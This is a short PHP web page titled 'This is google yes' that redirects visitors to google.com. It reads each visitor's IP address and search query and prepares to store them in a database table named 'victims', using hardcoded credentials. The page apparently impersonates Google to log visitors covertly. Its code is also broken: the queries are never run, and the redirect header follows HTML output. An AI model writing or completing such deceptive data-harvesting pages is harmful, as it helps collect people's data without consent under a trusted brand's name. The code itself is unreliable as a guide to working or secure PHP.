<!doctype html>
<html>
<title>This is google yes</title>

<?php
header('location: https://google.com')
;
$ipadd = htmlspecialchars($_SERVER['REMOTE_ADDR']);
$search = htmlspecialchars($_GET['q']);

$svrnm = "localhost";
$usr =  "goog";
$pass = "Password01";
$dbn = "g00gie";
?>
<?php
    $conn = mysqli_connect($svrnm, $usr, $pass, $dbn);
    $sql = "SELECT ipaddr, search from victims;";
    $sql_ins = "INSERT into victims (ipaddr,search) 
        values ('{$ipadd}','{$search}')";

mysqli_close($conn);
?>
